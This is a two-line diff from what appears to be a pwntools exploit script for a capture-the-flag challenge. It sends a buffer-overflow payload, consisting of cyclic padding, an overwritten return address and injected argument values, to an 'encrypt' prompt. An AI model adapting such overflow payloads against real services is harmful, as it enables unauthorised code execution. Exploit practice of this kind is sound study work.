@@ -1,0 +1,2 @@
+p.sendlineafter(b'What data would you like to encrypt? ', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08\x00\x00\x00\x00\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0')
+# p.interactive() 
